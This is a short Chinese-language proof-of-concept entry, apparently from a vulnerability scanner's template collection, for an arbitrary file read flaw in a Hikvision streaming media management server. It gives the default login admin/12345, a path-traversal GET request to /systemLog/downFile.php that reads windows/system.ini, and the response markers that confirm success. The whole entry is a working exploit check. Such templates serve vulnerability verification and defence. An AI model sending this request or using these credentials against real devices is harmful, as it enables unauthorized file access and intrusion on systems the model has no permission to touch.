﻿# HIKVISION 流媒体管理服务器后台任意文件读取漏洞

> 更新时间：2023-12-16

> 漏洞编号：

> 漏洞说明：默认账号密码为 admin/12345

> 漏洞特征：

> 验证脚本：HTTP

```
GET /systemLog/downFile.php?fileName=../../../../../../../../../../../../../../../windows/system.ini HTTP/1.1

```

> 响应代码特征：200

> 响应内容特征：support

> 上传文件定位：


> 验证文件来源：HIKVISION 流媒体管理服务器后台任意文件读取漏洞.poc
